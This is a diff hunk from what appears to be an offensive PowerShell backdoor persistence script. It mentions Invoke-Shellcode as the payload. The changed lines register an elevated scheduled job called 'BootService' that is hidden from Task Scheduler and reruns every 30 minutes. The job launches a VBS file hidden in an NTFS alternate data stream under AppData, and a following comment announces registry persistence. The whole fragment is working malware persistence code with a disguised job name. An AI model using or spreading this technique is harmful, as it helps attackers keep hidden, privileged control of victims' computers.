@@ -95,8 +95,8 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
     else {
        $Option = New-ScheduledJobOption -RunElevated -RequireNetwork -ContinueIfGoingOnBattery -StartIfOnBattery -HideInTaskScheduler
        $Trig = New-JobTrigger -Once -At "07:00 AM" -RepeatIndefinitely -RepetitionInterval "00:30:00"
-       $Script = "$env:USERPROFILE\AppData:$vbsFile"
-       Register-ScheduledJob –Name BootService –FilePath $Script –Trigger $Trig –ScheduledJobOption $Option
+       $Script = {wscript.exe $env:USERPROFILE\AppData:$vbsFile}
+       Register-ScheduledJob -Name BootService -ScriptBlock $Script -Trigger $Trig -ScheduledJobOption $Option
        "Process Complete. Persistent key is located at "
     }
     #Persist in Registry
